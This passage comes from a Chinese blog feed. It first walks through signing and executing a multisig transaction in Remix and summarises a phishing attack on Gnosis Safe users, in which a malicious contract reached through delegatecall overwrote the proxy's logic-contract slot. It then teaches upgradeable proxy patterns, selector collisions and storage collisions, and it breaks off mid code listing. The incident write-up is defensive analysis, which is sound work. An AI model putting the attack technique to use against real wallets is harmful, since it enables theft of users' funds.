class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">多签地址1: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</span><br><span class="line">多签地址2: 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2</span><br></pre></td></tr></table></figure><p><img src="remix1.png" alt=""></p><ol><li>调用<code>encodeTransactionData()</code>，编码并计算向多签地址1转账<code>1 ETH</code>的交易哈希。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">参数</span><br><span class="line">to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</span><br><span class="line">value: 1000000000000000000</span><br><span class="line">data: 0x</span><br><span class="line">_nonce: 0</span><br><span class="line">chainid: 1</span><br><span class="line"></span><br><span class="line">结果</span><br><span class="line">交易哈希： 0xb43ad6901230f2c59c3f7ef027c9a372f199661c61beeec49ef5a774231fc39b</span><br></pre></td></tr></table></figure><p><img src="remix2.png" alt=""></p><ol><li>利用Remix中ACCOUNT旁边的笔记图案的按钮进行签名，内容输入上面的交易哈希，获得签名，两个钱包都要签。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">多签地址1的签名: 0x014db45aa753fefeca3f99c2cb38435977ebb954f779c2b6af6f6365ba4188df542031ace9bdc53c655ad2d4794667ec2495196da94204c56b1293d0fbfacbb11c</span><br><span class="line">多签地址2的签名: 0xbe2e0e6de5574b7f65cad1b7062be95e7d73fe37dd8e888cef5eb12e964ddc597395fa48df1219e7f74f48d86957f545d0fbce4eee1adfbaff6c267046ade0d81c</span><br><span class="line">将两个签名拼接到一起，得到打包签名: 0x014db45aa753fefeca3f99c2cb38435977ebb954f779c2b6af6f6365ba4188df542031ace9bdc53c655ad2d4794667ec2495196da94204c56b1293d0fbfacbb11cbe2e0e6de5574b7f65cad1b7062be95e7d73fe37dd8e888cef5eb12e964ddc597395fa48df1219e7f74f48d86957f545d0fbce4eee1adfbaff6c267046ade0d81c</span><br></pre></td></tr></table></figure><ol><li>调用<code>execTransaction()</code>函数执行交易，将第3步中的交易参数和打包签名作为参数传入。可以看到交易执行成功，<code>ETH</code>被转出多签。</li></ol><p><img src="remix3.png" alt=""></p><p><img src="remix4.png" alt=""></p><p>到此为止，我们走完了整个从签名到交易的流程，大家应该已经对多签钱包的机制有了一定的了解。</p><h2 id="多签钱包相关安全事件"><a href="#多签钱包相关安全事件" class="headerlink" title="多签钱包相关安全事件"></a>多签钱包相关安全事件</h2><p>现目前多签钱包的应用有很多，最出名的应该是：</p><p><strong>Gnosis Safe</strong> <a href="https://gnosis-safe.io/" target="_blank" rel="noopener">https://gnosis-safe.io/</a></p><p><strong>Ownbit</strong> <a href="https://ownbit.pro/" target="_blank" rel="noopener">https://ownbit.pro/</a></p><p>其中我分析一个发生在Gnosis Safe上的一次钓鱼攻击，这个攻击方式比较综合，同时也可以帮我们更好的理解多签。</p><blockquote><p>相关信息均来自于慢雾</p></blockquote><h3 id="相关信息"><a href="#相关信息" class="headerlink" title="相关信息"></a><strong>相关信息</strong></h3><p>攻击者地址 1：</p><p>0x62a51ad133ca4a0f1591db5ae8c04851a9a4bf65</p><p>攻击者地址 2：</p><p>0x26a76f4fe7a21160274d060acb209f515f35429c</p><p>恶意逻辑实现合约 ETH 地址：</p><p>0x09afae029d38b76a330a1bdee84f6e03a4979359</p><p>恶意合约 ETH 地址 MultiSendCallOnly 合约：</p><p>0x3cb0652856d7eabe51f1e3cceda99c93b05d7cea</p><p>受攻击的代理合约地址：</p><p>0xc97f82c80df57c34e84491c0eda050ba924d7429</p><p>逻辑合约地址：</p><p>0x34cfac646f301356faa8b21e94227e3583fe3f5f</p><p>MultiSendCall 合约 ETH 地址：</p><p>0x40a2accbd92bca938b02010e17a5b8929b49130d</p><p>攻击交易：</p><p><a href="https://etherscan.io/tx/0x71c2d6d96a3fae4be39d9e571a2678d909b83ca97249140ce7027092aa77c74e" target="_blank" rel="noopener">https://etherscan.io/tx/0x71c2d6d96a3fae4be39d9e571a2678d909b83ca97249140ce7027092aa77c74e</a></p><h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><p>第一步：攻击者先是在 9 天前部署了恶意 MultiSendCall，并且验证了合约代码让这个攻击合约看起来像之前真正的 MultiSendCall。</p><p><img src="gnosis1.png" alt=""></p><p>第二步：攻击者通过钓⻥⼿段构造了⼀个指向恶意地址 calldata 数据让⽤户进⾏签名。calldata ⾥⾯正确的 to 地址应该是 0x40a2accbd92bca938b02010e17a5b8929b49130d，现在被更改成了恶意合约 ETH 地址 MultiSendCallOnly 合约 0x3cb0652856d7eabe51f1e3cceda99c93b05d7cea。</p><p>由于攻击者获取的签名数据是正确的，所以通过了验证多签的阶段，之后就开始执⾏了攻击合约的 multiSend 函数。</p><p><img src="gnosis2.png" alt=""></p><p><img src="gnosis3.png" alt=""></p><p>这时候通过查看攻击合约我们发现此处的修饰器 Payable 有赋值的情况存在。这时候我们通过对源码的反编译发现：</p><p><img src="gnosis4.png" alt=""></p><p>当 payment.version &lt; VERSION 这个条件触发的时候每次调⽤的时候都会对 storage[0x00] 进⾏重新赋值。这个 storage[0x00] 是不是特别眼熟？没错我们来看下 Proxy 合约。</p><p><img src="gnosis5.png" alt=""></p><p>当这笔交易执⾏完毕时 Proxy 的 storage[0x00] 已经变成0x020014b037686d9ab0e73798<strong>09afae029d38b76a330a1bdee84f6e03a4979359</strong> 。</p><p>由于 Proxy 合约执⾏的逻辑合约地址 masterCopy 是从 storage[0x00] 读取的，所以 Proxy 指向的逻辑合约会被攻击者更改为攻击合约。后续攻击者只需等待⽤户把⾜够的代币放⼊此合约，之后构造转账函数把钱取⾛即可。</p><p>攻击者为了避免被发现，在攻击合约中的逻辑中还实现了保证⽤户依然能正常使⽤相关的功能。</p><p>反编译攻击者的逻辑合约发现，在攻击合约的逻辑保证了攻击者动⼿前⽤户都可以正常使⽤多签功能。只有当攻击者⾃⼰调⽤的时候才会绕过验证直接把⽤户的钱取⾛。</p><p><img src="gnosis6.png" alt=""></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p><strong>本次攻击先是使⽤了钓⻥⼿段获取了⽤户的⼀次完整的多签数据，在利⽤了 delegatecall 调⽤外部合约的时候，如果外部合约有对数据进⾏更改的操作的话，会使⽤外部合约中变量存储所在对应的 slot 位置指向来影响当前合约同⼀个 slot 的数据。通过攻击合约把代理合约指向的逻辑指向⾃⼰的攻击合约。这样就可以随时绕过多签把合约的钱随时转⾛。</strong></p><p><strong>经过分析本次的事件，⼤概率是⿊客团队针对 Gnosis Safe Multi-sig 应⽤的⽤户进⾏的钓⻥攻击， 0x34cfac64 这个正常的逻辑合约是 Gnosis Safe 官⽅的地址，攻击者将这个地址硬编码在恶意合约中，所以这⼀系列的操作是适⽤于攻击所有 Gnosis Safe Multi-sig 应⽤的⽤户。此次攻击可能还有其他受害者。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 钱包 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 钱包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入可升级合约</title>
      <link href="/Proxy/"/>
      <url>/Proxy/</url>
      
        <content type="html"><![CDATA[<h1 id="深入可升级合约"><a href="#深入可升级合约" class="headerlink" title="深入可升级合约"></a>深入可升级合约</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p><code>Solidity</code>合约部署在链上之后，代码是不可变的（immutable）。这样既有优点，也有缺点：</p><ul><li>优点：安全，用户知道会发生什么（大部分时候）。</li><li>坏处：就算合约中存在bug，也不能修改或升级，只能部署新合约。但是新合约的地址与旧的不一样，且合约的数据也需要花费大量gas进行迁移。</li></ul><p>有没有办法在合约部署后进行修改或升级呢？答案是有的，那就是<strong>代理模式</strong>。</p><p><img src="proxy1.png" alt=""></p><p>代理模式将合约数据和逻辑分开，分别保存在不同合约中。我们拿上图中简单的代理合约为例，数据（状态变量）存储在代理合约中，而逻辑（函数）保存在另一个逻辑合约中。代理合约（Proxy）通过<code>delegatecall</code>，将函数调用全权委托给逻辑合约（Implementation）执行，再把最终的结果返回给调用者（Caller）。</p><p>代理模式主要有两个好处：</p><ol><li>可升级：当我们需要升级合约的逻辑时，只需要将代理合约指向新的逻辑合约。</li><li>省gas：如果多个合约复用一套逻辑，我们只需部署一个逻辑合约，然后再部署多个只保存数据的代理合约，指向逻辑合约。</li></ol><p>在代理模式中，代理合约就等同于数据库，作为一个存储数据的地方，更新系统时只需要更改逻辑合约即可。省去了升级中的数据迁移带来的巨大gas消耗。</p><p><img src="proxy_storage.png" alt=""></p><p>题外话：最近看到<code>MixBytes</code>团队一篇关于可升级合约存储解决方案的Blog，它是将传统数据库和区块链相结合的一种方式，采用了“协定数据库”的方案。</p><p><img src="proxy_Nosql.png" alt=""></p><p>利用智能合约开发了一个基于NoSQL的<a href="https://github.com/mixbytes/ethereum-cdf" target="_blank" rel="noopener">以太坊列式数据存储原型</a>。我觉得非常有意思。</p><p>原文连接：<a href="https://mixbytes.io/blog/storage-upgradable-ethereum-smart-contracts" target="_blank" rel="noopener">可升级以太坊智能合约的存储 (mixbytes.io)</a></p><h2 id="简单的可升级合约"><a href="#简单的可升级合约" class="headerlink" title="简单的可升级合约"></a>简单的可升级合约</h2><p>在理解了代理合约后，就很容易理解可升级合约。它就是一个可以更改逻辑合约的代理合约。</p><p><img src="upgrade.png" alt=""></p><h3 id="简单实现"><a href="#简单实现" class="headerlink" title="简单实现"></a>简单实现</h3><p>下面我们实现一个简单的可升级合约，它包含<code>3</code>个合约：代理合约，旧的逻辑合约，和新的逻辑合约。</p><h4 id="代理合约"><a href="#代理合约" class="headerlink" title="代理合约"></a>代理合约</h4><p><code>roxy</code>合约不长，但是用到了内联汇编，因此比较难理解。它只有一个状态变量，一个构造函数，和一个回调函数。状态变量<code>implementation</code>，在构造函数中初始化，用于保存<code>Logic</code>合约地址。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 简单的可升级合约，管理员可以通过升级函数更改逻辑合约地址，从而改变合约的逻辑。</span></span><br><span class="line">contract SimpleUpgrade &#123;</span><br><span class="line">    address public implementation; <span class="comment">// 逻辑合约地址</span></span><br><span class="line">    address public admin; <span class="comment">// admin地址</span></span><br><span class="line">    string public words; <span class="comment">// 字符串，可以通过逻辑合约的函数改变</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数，初始化admin和逻辑合约地址</span></span><br><span class="line">    <span class="keyword">constructor</span>(address _implementation)&#123;</span><br><span class="line">        admin = msg.sender;</span><br><span class="line">        implementation = _implementation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fallback函数，将调用委托给逻辑合约</span></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        address _implementation = implementation;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="comment">// 将msg.data拷贝到内存里</span></span><br><span class="line">            <span class="comment">// calldatacopy操作码的参数: 内存起始位置，calldata起始位置，calldata长度</span></span><br><span class="line">            calldatacopy(<span class="number">0</span>, <span class="number">0</span>, calldatasize())</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 利用delegatecall调用implementation合约</span></span><br><span class="line">            <span class="comment">// delegatecall操作码的参数：gas, 目标合约地址，input mem起始位置，input mem长度，output area mem起始位置，output area mem长度</span></span><br><span class="line">            <span class="comment">// output area起始位置和长度位置，所以设为0</span></span><br><span class="line">            <span class="comment">// delegatecall成功返回1，失败返回0</span></span><br><span class="line">            <span class="keyword">let</span> result := delegatecall(gas(), _implementation, <span class="number">0</span>, calldatasize(), <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将return data拷贝到内存</span></span><br><span class="line">            <span class="comment">// returndata操作码的参数：内存起始位置，returndata起始位置，returndata长度</span></span><br><span class="line">            returndatacopy(<span class="number">0</span>, <span class="number">0</span>, returndatasize())</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> result</span><br><span class="line">            <span class="comment">// 如果delegate call失败，revert</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span> &#123;</span><br><span class="line">                revert(<span class="number">0</span>, returndatasize())</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果delegate call成功，返回mem起始位置为0，长度为returndatasize()的数据（格式为bytes）</span></span><br><span class="line">            <span class="keyword">default</span> &#123;</span><br><span class="line">                <span class="keyword">return</span>(<span class="number">0</span>, returndatasize())</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 升级函数，改变逻辑合约地址，只能由admin调用</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upgrade</span>(<span class="params">address newImplementation</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == admin);</span><br><span class="line">        implementation = newImplementation;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Proxy</code>的回调函数将外部对本合约的调用委托给 <code>Logic</code> 合约。这个回调函数很别致，它利用内联汇编（inline assembly），让本来不能有返回值的回调函数有了<strong>返回值</strong>。其中用到的内联汇编操作码：</p><ul><li><code>calldatacopy(t, f, s)</code>：将calldata（输入数据）从位置<code>f</code>开始复制<code>s</code>字节到mem（内存）的位置<code>t</code>。</li><li><code>delegatecall(g, a, in, insize, out, outsize)</code>：调用地址<code>a</code>的合约，输入为<code>mem[in..(in+insize))</code> ，输出为<code>mem[out..(out+outsize))</code>， 提供<code>g</code>wei的以太坊gas。这个操作码在错误时返回<code>0</code>，在成功时返回<code>1</code>。</li><li><code>returndatacopy(t, f, s)</code>：将returndata（输出数据）从位置<code>f</code>开始复制<code>s</code>字节到mem（内存）的位置<code>t</code>。</li><li><code>switch</code>：基础版<code>if/else</code>，不同的情况<code>case</code>返回不同值。可以有一个默认的<code>default</code>情况。</li><li><code>return(p, s)</code>：终止函数执行, 返回数据<code>mem[p..(p+s))</code>。</li><li><code>revert(p, s)</code>：终止函数执行, 回滚状态，返回数据<code>mem[p..(p+s))</code>。</li></ul><h4 id="旧逻辑合约"><a href="#旧逻辑合约" class="headerlink" title="旧逻辑合约"></a>旧逻辑合约</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openzeppelin&#96;的文档中，一般称逻辑合约的英文为&#96;implementation contract&#96;而不是&#96;logic contract&#96;</span><br></pre></td></tr></table></figure><p>这个逻辑合约包含<code>3</code>个状态变量，与保持代理合约一致，防止插槽冲突。它只有一个函数<code>foo()</code>，将代理合约中的<code>words</code>的值改为<code>&quot;old&quot;</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 逻辑合约1</span></span><br><span class="line">contract Logic1 &#123;</span><br><span class="line">    <span class="comment">// 状态变量和proxy合约一致，防止插槽冲突</span></span><br><span class="line">    address public implementation; </span><br><span class="line">    address public admin; </span><br><span class="line">    string public words; <span class="comment">// 字符串，可以通过逻辑合约的函数改变</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 改变proxy中状态变量，选择器： 0xc2985578</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        words = <span class="string">"old"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="新逻辑合约"><a href="#新逻辑合约" class="headerlink" title="新逻辑合约"></a>新逻辑合约</h4><p>这个逻辑合约包含<code>3</code>个状态变量，与保持代理合约一致，防止插槽冲突。它只有一个函数<code>foo()</code>，将代理合约中的<code>words</code>的值改为<code>&quot;new&quot;</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 逻辑合约2</span></span><br><span class="line">contract Logic2 &#123;</span><br><span class="line">    <span class="comment">// 状态变量和proxy合约一致，防止插槽冲突</span></span><br><span class="line">    address public implementation; </span><br><span class="line">    address public admin; </span><br><span class="line">    string public words; <span class="comment">// 字符串，可以通过逻辑合约的函数改变</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 改变proxy中状态变量，选择器：0xc2985578</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        words = <span class="string">"new"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="管理者"><a href="#管理者" class="headerlink" title="管理者"></a>管理者</h4><p>管理者只需要调用SimpleUpgrade中的<code>upgrade(address logic2)</code>函数即可完成合约的升级。</p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>这样的可升级模式看起来会给<code>DEFI</code>项目带来很多便利，同时也带来许多问题：</p><h4 id="选择器碰撞"><a href="#选择器碰撞" class="headerlink" title="选择器碰撞"></a>选择器碰撞</h4><p>​            在solidity中，函数选择器是函数签名的哈希的前4个字节，但由于函数选择器仅有4个字节，范围很小，因此两个不同的函数可能会有相同的选择器，例如下面两个函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 选择器冲突的例子</span></span><br><span class="line">contract Foo &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">burn</span>(<span class="params">uint256</span>) <span class="title">external</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">collate_propagate_storage</span>(<span class="params">bytes16</span>) <span class="title">external</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例中，函数<code>burn()</code>和<code>collate_propagate_storage()</code>的选择器都为<code>0x42966c68</code>，是一样的，这种情况被称为“选择器冲突”。在这种情况下，<code>EVM</code>无法通过函数选择器分辨用户调用哪个函数，因此该合约无法通过编译。</p><p>由于代理合约和逻辑合约是两个合约，就算他们之间存在“选择器冲突”也可以正常编译，这可能会导致很严重的安全事故。举个例子，如果逻辑合约的<code>a</code>函数和代理合约的升级函数的选择器相同，那么管理人就会在调用<code>a</code>函数的时候，将代理合约升级成一个黑洞合约，后果不堪设想。</p><p>目前，有三种实现方式来避免这个问题，分别是：</p><ul><li>UUPS Implementation —— EIP1822</li><li>Transparent Proxy Implementation —— EIP1967</li></ul><ul><li>Diamond Implementation —— EIP2535</li></ul><p>其中，UUPS模式使用的最多，钻石协议比较新，被认为是很有潜力的一个EIP协议。</p><h4 id="存储冲突"><a href="#存储冲突" class="headerlink" title="存储冲突"></a>存储冲突</h4><p>由于委托调用的代理模式，使用代理时很快就会出现一个问题，与代理合约中存储变量的方式有关。假设代理将逻辑协定的地址存储在其唯一的变量中。现在，假设逻辑协定是一个基本标记，其第一个变量是 。这两个变量的大小均为 32 字节，据 EVM 所知，它们占据代理委托调用的结果执行流的第一个槽。当逻辑协定写入 时，它会在代理状态的范围内执行此操作，实际上写入 。此问题可称为“存储冲突”。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">|Proxy                     |Implementation           |</span><br><span class="line">|--------------------------|-------------------------|</span><br><span class="line">|address _implementation   |address _owner           | &lt;&#x3D;&#x3D;&#x3D; 存储碰撞</span><br><span class="line">|...                       |mapping _balances        |</span><br><span class="line">|                          |uint256 _supply          |</span><br><span class="line">|                          |...                      |</span><br></pre></td></tr></table></figure><h5 id="非结构化存储代理"><a href="#非结构化存储代理" class="headerlink" title="非结构化存储代理"></a>非结构化存储代理</h5><p>有很多方法可以克服这个问题，OpenZeppelin Upgrades实施的“非结构化存储”方法的工作原理如下。它不是将地址存储在代理的第一个存储槽中，而是选择一个伪随机槽。此插槽足够随机，逻辑合约在同一插槽中声明变量的概率可以忽略不计。在代理存储中随机化插槽位置的相同原理也用于代理可能具有的任何其他变量，例如管理员地址（允许更新的值）等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">|Proxy                     |Implementation           |</span><br><span class="line">|--------------------------|-------------------------|</span><br><span class="line">|...                       |address _owner           |</span><br><span class="line">|...                       |mapping _balances        |</span><br><span class="line">|...                       |uint256 _supply          |</span><br><span class="line">|...                       |...                      |</span><br><span class="line">|...                       |                         |</span><br><span class="line">|...                       |                         |</span><br><span class="line">|...                       |                         |</span><br><span class="line">|...                       |                         |</span><br><span class="line">|address _implementation   |                         | &lt;&#x3D;&#x3D;&#x3D; 随机的slot.</span><br><span class="line">|...                       |                         |</span><br><span class="line">|...                       |                         |</span><br></pre></td></tr></table></figure><p>在 <a href="http://eips.ethereum.org/EIPS/eip-1967" target="_blank" rel="noopener">EIP 1967</a> 之后如何实现随机存储的示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bytes32 private constant implementationPosition &#x3D; bytes32(uint256(</span><br><span class="line">  keccak256(&#39;eip1967.proxy.implementation&#39;)) - 1</span><br><span class="line">));</span><br></pre></td></tr></table></figure><p>因此，逻辑协定不需要关心覆盖代理的任何变量。面临此问题的其他代理实现通常意味着让代理了解逻辑协定的存储结构并适应它，或者让逻辑协定知道代理的存储结构并适应它。这就是为什么这种方法被称为“非结构化存储”的原因;任何一份合同都不需要关心另一份合同的结构。</p><h5 id="实现版本之间的存储冲突"><a href="#实现版本之间的存储冲突" class="headerlink" title="实现版本之间的存储冲突"></a>实现版本之间的存储冲突</h5><p>如前所述，非结构化方法避免了逻辑协定和代理之间的存储冲突。但是，不同版本的逻辑协定之间可能会发生存储冲突。在这种情况下，假设逻辑协定的第一个实现存储在第一个存储槽中，升级后的逻辑协定存储在同一个第一个槽中。当更新的逻辑协定尝试写入变量时，它将使用存储先前值的相同存储位置，并覆盖它。</p><p>不正确的存储保存：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">|Implementation_v0   |Implementation_v1        |</span><br><span class="line">|--------------------|-------------------------|</span><br><span class="line">|address _owner      |address _lastContributor | &lt;&#x3D;&#x3D;&#x3D; 存储碰撞</span><br><span class="line">|mapping _balances   |address _owner           |</span><br><span class="line">|uint256 _supply     |mapping _balances        |</span><br><span class="line">|...                 |uint256 _supply          |</span><br><span class="line">|                    |...                      |</span><br></pre></td></tr></table></figure><p>正确的存储保存：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">|Implementation_v0   |Implementation_v1        |</span><br><span class="line">|--------------------|-------------------------|</span><br><span class="line">|address _owner      |address _owner           |</span><br><span class="line">|mapping _balances   |mapping _balances        |</span><br><span class="line">|uint256 _supply     |uint256 _supply          |</span><br><span class="line">|...                 |address _lastContributor | &lt;&#x3D;&#x3D;&#x3D; 存储扩展</span><br><span class="line">|                    |...                      |</span><br></pre></td></tr></table></figure><p>非结构化存储代理机制无法防止这种情况。由用户决定让逻辑协定的新版本扩展以前的版本，或者保证存储层次结构始终追加但不修改。但是，OpenZeppelin Upgrades检测到此类冲突并适当地警告开发人员。</p><h2 id="四种可升级模式"><a href="#四种可升级模式" class="headerlink" title="四种可升级模式"></a>四种可升级模式</h2><p>在本文中只分析四种升级模式，接下来可能会写一篇文章深入EIP897，EIP1822，EIP1967，EIP2535。</p><p>需要注意的是除了EIP2535对应钻石代理以外，897，1822，1967是一个进化过程，现在oz库的UUPS，透明代理和信标代理均是在1967的基础上开发的。</p><p>目前大致有四种可升级方案，分别是</p><ul><li>UUPS代理</li><li>透明代理</li><li>信标代理</li><li>钻石代理</li></ul><p><code>OpenZeppelin</code>中包含的原始代理遵循<code>透明代理模式</code>，虽然<code>oz</code>仍然提供这种模式，但<code>oz</code>的建议是现在转向 UUPS 代理，它既轻量级又通用。</p><p>推荐阅读<code>OpenZeppelin</code>的官方博客：</p><p><a href="https://docs.openzeppelin.com/contracts/4.x/api/proxy" target="_blank" rel="noopener">Proxies - OpenZeppelin Docs</a></p><p>钻石代理是唯一没有被<code>OZ</code>收录的代理协议，一方面是因为此代理现在存在一定的争议，一方面是因为支持钻石代理对于oz来说工作量太大。就目前的情况来看，oz并不打算将钻石代理整合进oz库。</p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/issues/2793" target="_blank" rel="noopener">EIP-2535 Diamonds Implementation for OpenZeppelin · Issue #2793 · OpenZeppelin/openzeppelin-contracts (github.com)</a></p><h3 id="透明代理—Transparent"><a href="#透明代理—Transparent" class="headerlink" title="透明代理—Transparent"></a>透明代理—Transparent</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol"</span>;</span><br></pre></td></tr></table></figure><p>此协定实现可由管理员升级的代理。</p><p>这种模式意味着:</p><ul><li><p>如果管理员以外的任何帐户调用代理合约，则调用将转发到逻辑合约，即使该调用与代理本身公开的管理函数之一冲突。</p></li><li><p>如果管理员调用代理，它只可以访问管理功能，其调用永远不会转发到逻辑合约。如果管理员尝试在逻辑合约上调用函数，它将失败并显示错误 “管理员无法回退到代理目标”。</p></li></ul><p>这些属性意味着管理员帐户只能用于管理员操作，例如升级代理或更改 管理员，因此最好是不用于其他任何用途的专用帐户。这些属性将避免<strong>选择器冲突</strong>发送的可能。</p><p>以下是根据openzeppelin库给出的实现逻辑梳理的call graph：</p><p><img src="transparent.png" alt=""></p><h4 id="简单实现-1"><a href="#简单实现-1" class="headerlink" title="简单实现"></a>简单实现</h4><p>以下代码由<code>TransparentUpgradeableProxy</code>简化而成</p><h5 id="代理合约-1"><a href="#代理合约-1" class="headerlink" title="代理合约"></a>代理合约</h5><p>它包含<code>3</code>个变量：</p><ul><li><code>implementation</code>：逻辑合约地址。</li><li><code>admin</code>：admin地址。</li><li><code>words</code>：字符串，可以通过逻辑合约的函数改变。</li></ul><p>它包含<code>3</code>个函数</p><ul><li>构造函数：初始化admin和逻辑合约地址。</li><li><code>fallback()</code>：回调函数，将调用委托给逻辑合约，不能由<code>admin</code>调用。</li><li><code>upgrade()</code>：升级函数，改变逻辑合约地址，只能由<code>admin</code>调用。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 